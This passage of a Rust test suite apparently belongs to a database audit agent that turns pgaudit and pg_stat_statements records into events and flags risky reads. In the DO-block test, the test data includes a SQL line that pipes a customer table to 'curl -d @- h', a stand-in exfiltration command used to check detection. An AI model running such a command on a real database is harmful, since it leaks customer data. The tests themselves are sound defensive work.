        let events = b.convert(recs, SystemTime::now());
        assert_eq!(events.len(), 1);
        assert!(
            events[0].signals().contains(&Signal::CopyToFile),
            "{}",
            json(&events[0])
        );
        // A client COPY whose text shows it: no server-side signal.
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "x2",
            1,
            1,
            "READ",
            "COPY",
            "",
            "copy crm.t to stdout",
            Some(0),
            "psql",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert!(!events[0].signals().contains(&Signal::CopyToFile));
    }

    #[test]
    fn named_catalog_relations_are_skipped_not_wildcards() {
        // `pgaudit.log_catalog` / `log_relation` name catalog relations.
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(None));
        let recs = vec![
            rec(
                "c1",
                1,
                1,
                "READ",
                "SELECT",
                "public.pg_stat_statements_info",
                "SELECT 1 FROM \"public\".pg_stat_statements_info",
                Some(1),
                "psql",
            ),
            rec(
                "c1",
                2,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "select relname from pg_class",
                Some(1),
                "psql",
            ),
            // A catalog and a user relation: the user relation only.
            rec(
                "c1",
                3,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "select * from pg_class, crm.t",
                Some(1),
                "psql",
            ),
            rec(
                "c1",
                3,
                2,
                "READ",
                "SELECT",
                "crm.t",
                "select * from pg_class, crm.t",
                Some(1),
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 1, "{all:?}");
        assert!(
            all[0].contains("shop.crm.t") && !all[0].contains("*\""),
            "{all:?}"
        );
    }

    #[test]
    fn pg_stat_statements_names_count_only_in_the_extension_schema() {
        let read = |i: u64, object: &str, text: &str| {
            rec("k1", i, 1, "READ", "SELECT", object, text, Some(1), "psql")
        };
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(true)));
        let recs = vec![
            // The extension's relations in its schema: statistics, read
            // without the text (ADR-0049 decision 2).
            read(
                1,
                "public.pg_stat_statements",
                "select queryid, calls from public.pg_stat_statements",
            ),
            read(
                2,
                "public.pg_stat_statements_info",
                "select * from public.pg_stat_statements_info",
            ),
            // Look-alike names: a copy of data under a statistics name.
            read(
                3,
                "myschema.pg_stat_statements_x",
                "select * from myschema.pg_stat_statements_x",
            ),
            read(
                4,
                "public.pg_stat_statements_copy",
                "select * from public.pg_stat_statements_copy",
            ),
            read(
                5,
                "myschema.pg_stat_statements",
                "select * from myschema.pg_stat_statements",
            ),
            // Unnamed record: from the text.
            read(6, "", "select * from myschema.pg_stat_statements_x"),
        ];
        let all: Vec<String> = b
            .convert(recs, SystemTime::now())
            .iter()
            .map(json)
            .collect();
        assert_eq!(all.len(), 4, "{all:#?}");
        assert!(all[0].contains("myschema.pg_stat_statements_x"), "{all:#?}");
        assert!(
            all[1].contains("public.pg_stat_statements_copy"),
            "{all:#?}"
        );
        assert!(all[2].contains("myschema.pg_stat_statements\""), "{all:#?}");
        assert!(all[3].contains("myschema.pg_stat_statements_x"), "{all:#?}");
        // Without the extension in the database, no name counts.
        let mut b = PgauditEvents::new(own());
        let recs = vec![read(
            1,
            "public.pg_stat_statements",
            "select query from public.pg_stat_statements",
        )];
        assert_eq!(b.convert(recs, SystemTime::now()).len(), 1);
        // pg_stat_statements mode: the same rule on the text.
        let copy = analyze_pss("select * from myschema.pg_stat_statements_x", false);
        let view = analyze_pss("select query from public.pg_stat_statements", false);
        let bare = analyze_pss("select query from pg_stat_statements", false);
        let deltas = [
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &copy,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &view,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &bare,
                calls: 1,
                rows: 1,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &shop_catalogs(None), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(json(&ev[0]).contains("myschema.pg_stat_statements_x"));
    }

    #[test]
    fn unqualified_pg_names_need_pgaudit_confirmation_without_log_catalog() {
        let unnamed =
            |sess: &str, text: &str| rec(sess, 1, 1, "READ", "SELECT", "", text, Some(1), "psql");
        // `pgaudit.log_catalog = off`: a statement on catalogs only is not
        // logged, so a logged one naming only `pg_*` read something else.
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(false)));
        let ev = b.convert(
            vec![unnamed("u1", "select * from pg_loot")],
            SystemTime::now(),
        );
        assert_eq!(ev.len(), 1);
        assert!(json(&ev[0]).contains("shop..pg_loot"), "{}", json(&ev[0]));
        // Confirmed by pgaudit as a `pg_catalog` relation: skipped.
        let mut named = rec(
            "u2",
            1,
            2,
            "READ",
            "SELECT",
            "pg_catalog.pg_class",
            "select * from pg_class",
            Some(1),
            "psql",
        );
        named.audit.object_audit = true;
        let ev = b.convert(
            vec![unnamed("u2", "select * from pg_class"), named],
            SystemTime::now(),
        );
        assert!(
            ev.is_empty(),
            "{:?}",
            ev.iter().map(json).collect::<Vec<_>>()
        );
        // `log_catalog` on or unknown: unqualified `pg_*` names stay
        // catalogs (residual, README).
        for c in [shop_catalogs(Some(true)), Catalogs::default()] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(c);
            let ev = b.convert(
                vec![unnamed("u3", "select * from pg_loot")],
                SystemTime::now(),
            );
            assert!(ev.is_empty());
        }
    }

    #[test]
    fn previously_logged_records_reuse_their_first_text() {
        // `pgaudit.log_statement_once = on`.
        let mut b = PgauditEvents::new(own());
        let text = "select * from crm.t, crm.u";
        let recs = vec![
            rec("o1", 1, 1, "READ", "SELECT", "crm.t", text, Some(3), "psql"),
            rec(
                "o1",
                1,
                1,
                "READ",
                "SELECT",
                "crm.u",
                PREVIOUSLY_LOGGED,
                Some(3),
                "psql",
            ),
            // A substatement whose first record was not read.
            rec(
                "o1",
                1,
                2,
                "READ",
                "SELECT",
                "",
                PREVIOUSLY_LOGGED,
                Some(1),
                "psql",
            ),
        ];
        let ev = b.convert(recs, SystemTime::now());
        assert_eq!(ev.len(), 1);
        let e = json(&ev[0]);
        assert!(
            e.contains("shop.crm.t") && e.contains("shop.crm.u") && e.contains("shop..*"),
            "{e}"
        );
        assert!(e.contains("shape.full_table_read"), "{e}");
    }

    #[test]
    fn misc_classes_are_skipped() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "s5",
            1,
            1,
            "MISC",
            "SET",
            "",
            "set application_name = 'x'",
            None,
            "x",
        )];
        assert!(b.convert(recs, SystemTime::now()).is_empty());
    }

    #[test]
    fn do_blocks_functions_and_procedures_are_reported() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            // DO block, inner COPY logged with the block's text (substatement 2).
            rec(
                "d1",
                1,
                1,
                "FUNCTION",
                "DO",
                "",
                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
                None,
                "psql",
            ),
            rec(
                "d1",
                1,
                2,
                "READ",
                "COPY",
                "",
                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
                Some(0),
                "psql",
            ),
            // Same, inner COPY logged with its own text (pgaudit 16).
            rec(
                "d2",
                1,
                1,
                "READ",
                "COPY",
                "",
                "copy crm.customers to program 'cat > /dev/null'",
                Some(0),
                "psql",
            ),
            // plpgsql function, log_relation off: no object in the record.
            rec(
                "d3",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "select crm.f_pl()",
                Some(1),
                "psql",
            ),
            // SQL function body logged as its own substatement with object.
            rec(
                "d4",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "select count(*) from crm.customers",
                Some(1),
                "psql",
            ),
            rec(
                "d4",
                1,
                2,
                "READ",
                "SELECT",
                "",
                "select crm.f_sql()",
                Some(1),
                "psql",
            ),
            // Procedure.
            rec(
                "d5",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "CALL crm.p()",
                None,
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 5, "{all:#?}");
        assert!(
            all[0].contains("signature.copy_to_program") && all[0].contains("shop.crm.customers"),
            "{}",
            all[0]
        );
        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
        assert!(
            all[2].contains("shop..*"),
            "unknown object reported as *: {}",
            all[2]
        );
        assert!(
            all[3].contains("shop.crm.customers") && all[3].contains("shop..*"),
            "{}",
            all[3]
        );
        assert!(all[4].contains("shop..*"), "{}", all[4]);
    }

    #[test]
    fn statements_are_matched_by_command_tag() {
        let mut b = PgauditEvents::new(own());
        let text = "select 1; copy crm.customers to program 'x'";
        let recs = vec![
            rec("m1", 5, 1, "READ", "SELECT", "", text, Some(1), "psql"),
            rec("m1", 6, 1, "READ", "COPY", "", text, Some(0), "psql"),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 2, "{all:#?}");
        assert!(
            !all[0].contains("shape.full_table_read") && !all[0].contains("copy_to"),
            "{}",
            all[0]
        );
        assert!(
            all[1].contains("signature.copy_to_program") && all[1].contains("crm.customers"),
            "{}",
            all[1]
        );
    }

    #[test]
    fn value_like_names_are_masked() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "s6",
            1,
            1,
            "READ",
            "SELECT",
            "crm.export_client_0639988384",
            "select * from crm.export_client_0639988384",
            Some(1),
            "x",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert!(!json(&events[0]).contains("0639988384"));
    }

    #[test]
    fn pss_deltas() {
        let copy = analyze_pss("COPY crm.customers (id) TO stdout", false);
        let copy2 = analyze_pss("COPY crm.b (id) TO stdout", false);
        let copy3 = analyze_pss("COPY crm.c (id) TO stdout", false);
        let sel = analyze_pss("select * from crm.customers where id = $1", false);
        let ddl = analyze_pss("alter table crm.customers add column x int", false);
        let deltas = [
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "u",
                database: "shop",
                analysis: &copy,
                calls: 1,
                rows: 150,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "u",
                database: "shop",
                analysis: &copy2,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "u",
                database: "shop",
                analysis: &copy3,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "v",
                database: "shop",
                analysis: &sel,
                calls: 30,
                rows: 30,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "v",
                database: "shop",
                analysis: &ddl,
                calls: 1,
                rows: 0,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let t1 = t0 + std::time::Duration::from_secs(10);
        let events = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t1);
        assert_eq!(events.len(), 5);
        assert!(events[0].signals().contains(&Signal::PgDump));
        assert!(events[0].signals().contains(&Signal::FullTableCopy));
        assert_eq!(events[3].aggregated_count(), 30);
        assert_eq!(events[3].ts_last(), Some(t1));
        assert!(events[3].signals().is_empty());
        assert_eq!(events[4].action(), EventAction::Ddl);
        assert!(
            events
                .iter()
                .all(|e| e.source() == EventSource::PgStatStatements)
        );
        assert!(events.iter().all(|e| e.principal().client().is_none()));
    }

    #[test]
    fn object_names_split() {
        let r = split_object_name("crm.customers").unwrap();
        assert_eq!(
            (r.schema.as_deref(), r.name.as_str()),
            (Some("crm"), "customers")
        );
        let r = split_object_name("\"My.Schema\".\"T\"\"x\"").unwrap();
        assert_eq!(
            (r.schema.as_deref(), r.name.as_str()),
            (Some("My.Schema"), "T\"x")
        );
        assert!(split_object_name("a..b").is_none());
        assert!(split_object_name("\"open").is_none());
    }

    /// Security review of #85: on `pg_stat_statements`, a statement whose
    /// conversion panics is dropped alone and counted; the others give
    /// their events.
    #[test]
    fn a_panicking_pss_conversion_drops_one_statement() {
        let t0 = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1000);
        let read = analyze_pss("SELECT * FROM crm.customers", false);
        let deltas = vec![
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: TEST_POISON_USER,
                database: "shop",
                analysis: &read,
                calls: 1,
                rows: 5,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "alice",
                database: "shop",
                analysis: &read,
                calls: 1,
                rows: 5,
            },
        ];
        let (events, panicked) =
            pss_events_counted(&deltas, &mut own(), &Catalogs::default(), t0, t0);
        assert_eq!(panicked, [0]);
        assert_eq!(events.len(), 2);
        assert_eq!(events[0].principal().account_name(), TEST_POISON_USER);
        // The panicking statement is still reported, against `*`.
        assert!(json(&events[0]).contains("shop..*"), "{}", json(&events[0]));
        assert!(events[0].signals().is_empty());
        assert_eq!(events[1].principal().account_name(), "alice");
        assert!(json(&events[1]).contains("customers"));
    }

    #[test]
    fn unanalyzed_pss_deltas_are_reads_of_unknown_objects() {
        let t0 = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1000);
        let e = pss_unanalyzed_event("databastion", "shop", 3, LARGE_ROWS + 1, t0, t0);
        let j = json(&e);
        assert!(j.contains("shop..*"), "{j}");
        assert_eq!(e.action(), EventAction::Read);
        assert!(e.signals().contains(&Signal::LargeResult));
        assert!(
            pss_unanalyzed_event("alice", "shop", 1, 5, t0, t0)
                .signals()
                .is_empty()
        );
    }

    /// Security review of #85: on `pg_stat_statements`, role changes are
    /// `dcl` events, as on pgaudit (its `ROLE` class), so `dcl` policies
    /// see them.
    #[test]
    fn pss_role_changes_are_dcl() {
        let t0 = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1000);
        for q in [
            "CREATE ROLE r LOGIN PASSWORD $1",
            "ALTER ROLE r WITH PASSWORD $1",
            "ALTER USER u PASSWORD $1",
            "DROP ROLE r",
            "GRANT SELECT ON crm.customers TO r",
        ] {
            let analysis = analyze_pss(q, false);
            let deltas = vec![StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "alice",
                database: "shop",
                analysis: &analysis,
                calls: 1,
                rows: 0,
            }];
            let ev = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0);
            assert_eq!(ev.len(), 1, "{q}");
            assert_eq!(ev[0].action(), EventAction::Dcl, "{q}");
        }
    }

    /// Statement texts reading each statistics relation, in every form
    /// (ADR-0048 decisions 1 and 2, open question 4): qualified,
    /// unqualified, quoted in lower case, whole-row, `TABLE`, a column
    /// that holds no value, a join with an application table, a subquery.
    fn statistics_texts(name: &str) -> Vec<(String, bool)> {
        vec![
            (format!("SELECT * FROM pg_catalog.{name}"), false),
            (format!("select * from {name}"), false),
            (format!("SELECT * FROM \"pg_catalog\".\"{name}\""), false),
            (format!("SELECT s FROM {name} s"), false),
            (
                format!("SELECT row_to_json(s) FROM pg_catalog.{name} AS s"),
                false,
            ),
            (format!("TABLE {name}"), false),
            (format!("SELECT count(*) FROM {name} WHERE true"), false),
            (
                format!("SELECT c.email, s.* FROM crm.customer c JOIN {name} s ON true"),
                true,
            ),
            (
                format!(
                    "SELECT * FROM crm.customer WHERE email IN (SELECT 'x' FROM pg_catalog.{name})"
                ),
                true,
            ),
            (
                format!(
                    "WITH x AS (SELECT * FROM {name}) SELECT * FROM x JOIN pg_catalog.pg_class c ON true"
                ),
                false,
            ),
        ]
    }

    fn objects_of(e: &MaskedEvent) -> Vec<String> {
        e.objects()
            .iter()
            .map(|o| {
                format!(
                    "{}.{}.{}",
                    o.database().as_str(),
                    o.schema().map_or("", |s| s.as_str()),
                    o.object().as_str()
                )
            })
            .collect()
    }

    fn want_objects(name: &str, with_customer: bool) -> Vec<String> {
        let mut v = vec![format!("shop.pg_catalog.{name}")];
        if with_customer {
            v.push("shop.crm.customer".to_owned());
            v.sort();
        }
        v
    }

    /// ADR-0048 decisions 1 to 4 with pgaudit, `log_relation` off (the
    /// text decides) and `log_catalog` on, off or unknown: every
    /// statistics relation in every form is a read naming it as
    /// `pg_catalog.<name>`, always reported, from any account; the agent's
    /// own is never left out nor charged.
    #[test]
    fn pgaudit_statistics_reads_from_the_text() {
        for name in STATISTICS_RELATIONS {
            for (text, with_customer) in statistics_texts(name) {
                for log_catalog in [Some(true), Some(false), None] {
                    for app in ["psql", crate::conn::APPLICATION_NAME] {
                        let usage = SharedOwnUsage::default();
                        let mut b = PgauditEvents::new(own_with(
                            ClientAddr::parse("192.0.2.14"),
                            1000,
                            usage.clone(),
                        ));
                        b.set_catalogs(shop_catalogs(log_catalog));
                        let ev = b.convert(
                            vec![rec("s1", 1, 1, "READ", "SELECT", "", &text, Some(1), app)],
                            SystemTime::now(),
                        );
                        assert_eq!(ev.len(), 1, "{app} {log_catalog:?}: {text}");
                        let e = &ev[0];
                        assert_eq!(e.action(), EventAction::Read);
                        assert!(e.always_report(), "{app}: {text}");
                        assert_eq!(
                            objects_of(e),
                            want_objects(name, with_customer),
                            "{app} {log_catalog:?}: {text}"
                        );
                        assert!(charged_keys(&usage).is_empty(), "{app}: {text}");
                    }
                }
            }
        }
    }

    /// ADR-0048 decisions 2 and 5 with pgaudit `log_relation`: a relation
    /// record naming a statistics relation (`log_catalog = on`), and the
    /// text when the relation records leave the catalog out
    /// (`log_catalog = off`, a statement that also reads an application
    /// table).
    #[test]
    fn pgaudit_statistics_reads_from_relation_records() {
        for name in STATISTICS_RELATIONS {
            for app in ["psql", crate::conn::APPLICATION_NAME] {
                // `log_catalog = on`: the view, its base table and the
                // other catalogs it joins are named by records.
                let text = format!("select most_common_vals from {name} where attname = 'email'");
                let mut b = PgauditEvents::new(own());
                b.set_catalogs(shop_catalogs(Some(true)));
                let mut recs = vec![rec(
                    "r1",
                    1,
                    1,
                    "READ",
                    "SELECT",
                    &format!("pg_catalog.{name}"),
                    &text,
                    Some(3),
                    app,
                )];
                for (i, base) in ["pg_catalog.pg_statistic", "pg_catalog.pg_class"]
                    .iter()
                    .enumerate()
                {
                    recs.push(rec(
                        "r1",
                        1,
                        2 + i as u64,
                        "READ",
                        "SELECT",
                        base,
                        &text,
                        Some(3),
                        app,
                    ));
                }
                let ev = b.convert(recs, SystemTime::now());
                assert_eq!(ev.len(), 1, "{app}: {name}");
                assert!(ev[0].always_report());
                assert_eq!(ev[0].rows(), Some(3));
                let mut want = vec![format!("shop.pg_catalog.{name}")];
                if *name != "pg_statistic" {
                    want.push("shop.pg_catalog.pg_statistic".to_owned());
                }
                want.sort();
                assert_eq!(objects_of(&ev[0]), want, "{app}: {name}");
                // `log_catalog = off`: only the application table's record.
                let text = format!("select c.email from crm.customer c, {name} s");
                let mut b = PgauditEvents::new(own());
                b.set_catalogs(shop_catalogs(Some(false)));
                let ev = b.convert(
                    vec![rec(
                        "r2",
                        1,
                        1,
                        "READ",
                        "SELECT",
                        "crm.customer",
                        &text,
                        Some(1),
                        app,
                    )],
                    SystemTime::now(),
                );
                assert_eq!(ev.len(), 1, "{app}: {name}");
                assert!(ev[0].always_report());
                assert_eq!(objects_of(&ev[0]), want_objects(name, true), "{app}");
            }
        }
        // Statements copying statistics (security review of #199, M1): with
        // relation records naming only the target (`log_catalog` off or
        // unknown), every action class names the statistics relations of
        // its text, always reported.
        for (class, command, object, text, action) in [
            (
                "WRITE",
                "INSERT",
                "crm.copy",
                "insert into crm.copy select * from pg_stats",
                EventAction::Write,
            ),
            (
                "DDL",
                "CREATE TABLE AS",
                "crm.x",
                "create table crm.x as select * from pg_catalog.pg_stats",
                EventAction::Ddl,
            ),
        ] {
            for log_catalog in [Some(false), None, Some(true)] {
                let mut b = PgauditEvents::new(own());
                b.set_catalogs(shop_catalogs(log_catalog));
                let ev = b.convert(
                    vec![rec(
                        "w1",
                        1,
                        1,
                        class,
                        command,
                        object,
                        text,
                        Some(1),
                        "psql",
                    )],
                    SystemTime::now(),
                );
                assert_eq!(ev.len(), 1, "{text}");
                assert_eq!(ev[0].action(), action);
                assert!(ev[0].always_report(), "{text}");
                let mut want = vec![
                    "shop.pg_catalog.pg_stats".to_owned(),
                    format!("shop.{object}"),
                ];
                want.sort();
                assert_eq!(objects_of(&ev[0]), want, "{log_catalog:?}: {text}");
            }
        }
        // `log_catalog = on` with a record naming only the application
        // table (a pgaudit that would not name catalog relations): the
        // text's statistics relations are still named (security review of
        // #199, L1).
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(true)));
        let ev = b.convert(
            vec![rec(
                "w2",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customer",
                "select * from crm.customer, pg_stats",
                Some(1),
                "psql",
            )],
            SystemTime::now(),
        );
        assert_eq!(objects_of(&ev[0]), want_objects("pg_stats", true));
        assert!(ev[0].always_report());
    }

    /// ADR-0048 decision 1: look-alikes are not statistics relations, and
    /// dictionary reads stay quiet.
    #[test]
    fn statistics_look_alikes_and_dictionary_reads() {
        // A quoted upper-case name and another schema: ordinary relations,
        // not always reported (a user's own relations).
        for (text, object) in [
            ("select * from \"PG_STATS\"", "shop..PG_STATS"),
            ("select * from public.pg_stats", "shop.public.pg_stats"),
            ("select * from crm.pg_statistic", "shop.crm.pg_statistic"),
        ] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(Some(true)));
            let ev = b.convert(
                vec![rec("l1", 1, 1, "READ", "SELECT", "", text, Some(1), "psql")],
                SystemTime::now(),
            );
            assert_eq!(ev.len(), 1, "{text}");
            assert!(!ev[0].always_report(), "{text}");
            assert_eq!(objects_of(&ev[0]), [object], "{text}");
        }
        // `public.pg_stats` named by a relation record: with `log_catalog
        // = on` (and no `pg_catalog.pg_stats` record), the unqualified text
        // name is that relation (it shadows the catalog's); otherwise the
        // catalog's is named too, always reported (security re-review of
        // #199, N-M1).
        for (log_catalog, want, always) in [
            (Some(true), vec!["shop.public.pg_stats"], false),
            (
                Some(false),
                vec!["shop.pg_catalog.pg_stats", "shop.public.pg_stats"],
                true,
            ),
            (
                None,
                vec!["shop.pg_catalog.pg_stats", "shop.public.pg_stats"],
                true,
            ),
        ] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(log_catalog));
            let ev = b.convert(
                vec![rec(
                    "l2",
                    1,
                    1,
                    "READ",
                    "SELECT",
                    "public.pg_stats",
                    "select * from pg_stats",
                    Some(1),
                    "psql",
                )],
                SystemTime::now(),
            );
            assert_eq!(objects_of(&ev[0]), want, "{log_catalog:?}");
            assert_eq!(ev[0].always_report(), always, "{log_catalog:?}");
        }
        // Security re-review of #199, N-M1: a qualified shadowing name next
        // to the unqualified one, with `log_catalog` off or unknown: the
        // catalog's is named too.
        for log_catalog in [Some(false), None] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(log_catalog));
            let ev = b.convert(
                vec![rec(
                    "l3",
                    1,
                    1,
                    "READ",
                    "SELECT",
                    "public.pg_stats",
                    "select * from pg_stats p, public.pg_stats x",
                    Some(1),
                    "psql",
                )],
                SystemTime::now(),
            );
            assert_eq!(
                objects_of(&ev[0]),
                ["shop.pg_catalog.pg_stats", "shop.public.pg_stats"],
                "{log_catalog:?}"
            );
            assert!(ev[0].always_report(), "{log_catalog:?}");
        }
        // A DO block whose first substatement reads `public.pg_stats` and
        // whose second reads `pg_stats` (the catalog's): the shadowing is
        // decided per substatement, whatever `log_catalog` says.
        for log_catalog in [Some(true), Some(false), None] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(log_catalog));
            let ev = b.convert(
                vec![
                    rec(
                        "l4",
                        1,
                        1,
                        "READ",
                        "SELECT",
                        "public.pg_stats",
                        "select * from public.pg_stats",
                        Some(1),
                        "psql",
                    ),
                    rec(
                        "l4",
                        1,
                        2,
                        "READ",
                        "SELECT",
                        "crm.customer",
                        "select * from crm.customer, pg_stats",
                        Some(1),
                        "psql",
                    ),
                ],
                SystemTime::now(),
            );
            assert_eq!(ev.len(), 1, "{log_catalog:?}");
            assert_eq!(
                objects_of(&ev[0]),
                [
                    "shop.crm.customer",
                    "shop.pg_catalog.pg_stats",
                    "shop.public.pg_stats"
                ],
                "{log_catalog:?}"
            );
            assert!(ev[0].always_report(), "{log_catalog:?}");
        }
        // Dictionary reads and the counter views: quiet.
        for text in [
            "select * from pg_attribute",
            "select * from pg_catalog.pg_stat_user_tables",
            "select * from pg_statio_user_tables",
            "select * from information_schema.columns",
            "select * from pg_catalog.pg_statistic_ext",
        ] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(Some(true)));
            let ev = b.convert(
                vec![rec("d1", 1, 1, "READ", "SELECT", "", text, Some(1), "psql")],
                SystemTime::now(),
            );
            assert!(ev.is_empty(), "{text}");
            let a = analyze_pss(text, false);
            let deltas = [StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &a,
                calls: 1,
                rows: 1,
            }];
            let t0 = SystemTime::UNIX_EPOCH;
            assert!(
                pss_events(&deltas, &mut own(), &shop_catalogs(None), t0, t0).is_empty(),
                "{text}"
            );
        }
        assert!(
            statistics_relation(&RelationName {
                schema: Some("pg_catalog".to_owned()),
                name: "pg_stats_ext_exprs".to_owned(),
            })
            .is_some()
        );
        assert!(
            statistics_relation(&RelationName {
                schema: Some("pg_toast".to_owned()),
                name: "pg_stats".to_owned(),
            })
            .is_none()
        );
    }

    /// ADR-0048 with `pg_stat_statements`: every statistics relation in
    /// every form (and in the stored form, constants as `$n`) is a read
    /// naming it, always reported, with its row count, from any role, the
    /// agent's never left out nor charged.
    #[test]
    fn pss_statistics_reads() {
        for name in STATISTICS_RELATIONS {
            let mut texts = statistics_texts(name);
            texts.push((
                format!(
                    "SELECT histogram_bounds FROM {name} WHERE schemaname = $1 AND tablename = $2"
                ),
                false,
            ));
            for (text, with_customer) in texts {
                for user in ["app", "databastion"] {
                    let usage = SharedOwnUsage::default();
                    let mut own = own_with(None, 1000, usage.clone());
                    let a = analyze_pss(&text, false);
                    let deltas = [StatementDelta {
                        reads: &NO_READS,
                        own_text: false,
                        user,
                        database: "shop",
                        analysis: &a,
                        calls: 2,
                        rows: 399,
                    }];
                    let t0 = SystemTime::UNIX_EPOCH;
                    let ev = pss_events(&deltas, &mut own, &shop_catalogs(None), t0, t0);
                    assert_eq!(ev.len(), 1, "{user}: {text}");
                    assert!(ev[0].always_report(), "{user}: {text}");
                    assert_eq!(ev[0].rows(), Some(399));
                    assert_eq!(
                        objects_of(&ev[0]),
                        want_objects(name, with_customer),
                        "{user}: {text}"
                    );
                    // No shape signal from a statistics relation alone.
                    if !with_customer {
                        assert!(ev[0].signals().is_empty(), "{user}: {text}");
                    }
                    assert!(charged_keys(&usage).is_empty(), "{user}: {text}");
                }
            }
        }
    }

    /// ADR-0048 decision 3: statistics relations are named first; a text
    /// at the analyzer's relation bound (16 relations) may hide one, so it
    /// adds `*`, is always reported and is never the agent's own, when
    /// the text decides.
    #[test]
    fn statistics_relations_at_the_relation_bound() {
        let many: Vec<String> = (0..20).map(|i| format!("crm.t{i:02}")).collect();
        let hidden = format!("select * from {}, pg_stats", many.join(", "));
        let first = format!("select * from pg_stats, {}", many.join(", "));
        for user in ["app", "databastion"] {
            for text in [&hidden, &first] {
                let usage = SharedOwnUsage::default();
                let a = analyze_pss(text, false);
                let deltas = [StatementDelta {
                    reads: &NO_READS,
                    own_text: false,
                    user,
                    database: "shop",
                    analysis: &a,
                    calls: 1,
                    rows: 1,
                }];
                let t0 = SystemTime::UNIX_EPOCH;
                let ev = pss_events(
                    &deltas,
                    &mut own_with(None, 1000, usage.clone()),
                    &shop_catalogs(None),
                    t0,
                    t0,
                );
                assert_eq!(ev.len(), 1);
                assert!(ev[0].always_report());
                let objects = objects_of(&ev[0]);
                assert_eq!(objects.len(), 16, "{objects:?}");
                assert!(objects.iter().any(|o| o == "shop..*"), "{objects:?}");
                if text == &first {
                    assert!(
                        objects.iter().any(|o| o == "shop.pg_catalog.pg_stats"),
                        "{objects:?}"
                    );
                }
                assert!(charged_keys(&usage).is_empty());
                // pgaudit without relation records: the same.
                for app in ["psql", crate::conn::APPLICATION_NAME] {
                    let mut b = PgauditEvents::new(own());
                    b.set_catalogs(shop_catalogs(Some(true)));
                    let ev = b.convert(
                        vec![rec("b1", 1, 1, "READ", "SELECT", "", text, Some(1), app)],
                        SystemTime::now(),
                    );
                    assert_eq!(ev.len(), 1);
                    assert!(ev[0].always_report());
                    assert!(objects_of(&ev[0]).iter().any(|o| o == "shop..*"));
                }
            }
        }
        // Sixteen catalogs, then a statistics relation (security review of
        // #199, H1): the catalog-only skip must not hide it.
        let catalogs = [
            "pg_class",
            "pg_attribute",
            "pg_namespace",
            "pg_type",
            "pg_proc",
            "pg_index",
            "pg_constraint",
            "pg_database",
            "pg_roles",
            "pg_tables",
            "pg_views",
            "pg_am",
            "pg_opclass",
            "pg_operator",
            "pg_language",
            "pg_depend",
        ];
        for prefix in ["", "pg_catalog."] {
            let names: Vec<String> = catalogs.iter().map(|c| format!("{prefix}{c}")).collect();
            let text = format!("select * from {}, {prefix}pg_stats", names.join(", "));
            for user in ["app", "databastion"] {
                let usage = SharedOwnUsage::default();
                let a = analyze_pss(&text, false);
                let deltas = [StatementDelta {
                    reads: &NO_READS,
                    own_text: false,
                    user,
                    database: "shop",
                    analysis: &a,
                    calls: 1,
                    rows: 1,
                }];
                let t0 = SystemTime::UNIX_EPOCH;
                let ev = pss_events(
                    &deltas,
                    &mut own_with(None, 1000, usage.clone()),
                    &shop_catalogs(None),
                    t0,
                    t0,
                );
                assert_eq!(ev.len(), 1, "{user}: {text}");
